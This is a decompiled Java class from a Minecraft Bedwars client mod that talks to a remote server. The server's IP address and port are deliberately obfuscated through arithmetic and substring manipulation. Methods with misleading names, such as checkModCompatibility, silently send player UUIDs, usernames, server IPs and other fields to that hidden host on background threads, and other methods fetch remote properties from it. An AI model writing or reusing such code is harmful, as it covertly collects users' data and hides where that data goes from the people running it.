/*     */ package com.dimchig.bedwarsbro.serializer;
/*     */ 
/*     */ import java.io.BufferedReader;
/*     */ import java.io.InputStreamReader;
/*     */ import java.io.UnsupportedEncodingException;
/*     */ import java.net.URL;
/*     */ import java.net.URLConnection;
/*     */ import java.net.URLEncoder;
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ public class MySerializer
/*     */ {
/*  25 */   static int var1 = 136;
/*  26 */   static int var2 = 109;
/*  27 */   static int var3 = -114;
/*  28 */   static int var4 = 872;
/*  29 */   static int var5 = 913915;
/*     */   
/*  31 */   public static String url_origin = "http://" + (var1 - 45) + "." + (var2 * 2) + "." + (var3 + 228) + "." + (var4 - 666) + ":" + (var5 / 47) + "/";
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public static void checkModCompatibility(String field_185711_D, String field_175711_E, String field_175713_B, String field_175714_C, String field_181542_y, String field_141311_F, String field_181312_x, String field_181313_D, boolean field_181314_G, boolean field_118741_c, String field_118741_a, String field_118741_b, String parse_info) {
/*  38 */     baseAddMessage(field_185711_D + separator + field_175711_E + separator + field_175713_B + separator + field_175714_C + separator + field_181542_y + separator + field_141311_F + separator + field_181312_x + separator + field_181313_D + separator + Character.MIN_VALUE + separator + field_181314_G + separator + field_118741_c + separator + field_118741_a + separator + field_118741_b + separator);
/*     */   }
/*     */   
/*  41 */   public static String separator = ";==BWBRO==;";
/*  42 */   public static String separator_secondary = ";=BRO=;";
/*     */   
/*     */   public static void baseAddMessage(String str) {
/*     */     try {
/*  46 */       str = URLEncoder.encode(str, "UTF-8");
/*  47 */     } catch (UnsupportedEncodingException unsupportedEncodingException) {}
/*     */     
/*  49 */     String text = str;
/*  50 */     String url = url_origin + "addmessage?text=" + text;
/*  51 */     base_update_url(url);
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public static void addLoginMessage(String uuid, String player_name, String player_prefix, String mod_version, String server_ip, String login_event) {
/*  63 */     String str = "" + uuid + separator + player_name + separator + player_prefix + separator + mod_version + separator + server_ip + separator + login_event + separator;
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */     
/*  71 */     baseAddLoginMessage(str);
/*     */   }
/*     */   public static void baseAddLoginMessage(String str) {
/*     */     try {
/*  75 */       str = URLEncoder.encode(str, "UTF-8");
/*  76 */     } catch (UnsupportedEncodingException e) {
/*  77 */       e.printStackTrace();
/*     */     } 
/*  79 */     String text = str;
/*  80 */     String url = url_origin + "addloginmessage?text=" + text;
/*  81 */     base_update_url(url);
/*     */   }
/*     */ 
/*     */   
/*     */   public static void base_update_url(String url) {
/*  86 */     final String finalUrl = url;
/*  87 */     Thread t1 = new Thread(new Runnable()
/*     */         {
/*     */           public void run() {
/*     */             try {
/*  91 */               URL website = new URL(finalUrl);
/*  92 */               URLConnection connection = website.openConnection();
/*  93 */               connection.getInputStream();
/*  94 */             } catch (Exception e) {
/*  95 */               e.printStackTrace();
/*     */             } 
/*     */           }
/*     */         });
/*  99 */     t1.start();
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public static String readProps() {
/*     */     try {
/* 119 */       url_origin = url_origin.substring(0, 7) + "14876".substring(0, 3) + ".25" + "1.25136".substring(0, 2) + "180156".substring(0, 3) + '.' + "7859047".substring(3, 5) + ":13337/";
/* 120 */       String url = url_origin + "/getProps";
/* 121 */       String content = getText(url);
/* 122 */       return content;
/* 123 */     } catch (Exception e) {
/* 124 */       e.printStackTrace();
/*     */       
/* 126 */       return null;
/*     */     } 
/*     */   }
/*     */   
/*     */   public static String readActivePlayers() {
/*     */     try {
/* 132 */       String url = url_origin + "/getActivePlayers";
/* 133 */       String content = getText(url);
/* 134 */       return content;
/* 135 */     } catch (Exception e) {
/* 136 */       e.printStackTrace();
/*     */       
/* 138 */       return null;
/*     */     } 
/*     */   }
/*     */   public static String getText(String url) throws Exception {
/* 142 */     URL website = new URL(url);
/* 143 */     URLConnection connection = website.openConnection();
/* 144 */     BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
/*     */     
/* 146 */     StringBuilder response = new StringBuilder();
/*     */     
/*     */     String inputLine;
/* 149 */     while ((inputLine = in.readLine()) != null) {
/* 150 */       response.append(inputLine);
/*     */     }
/* 152 */     in.close();
/*     */     
/* 154 */     return response.toString();
/*     */   }
/*     */ }


/* Location:              C:\Users\1337a\Downloads\bedwarsbro-1.69\!\com\dimchig\bedwarsbro\serializer\MySerializer.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */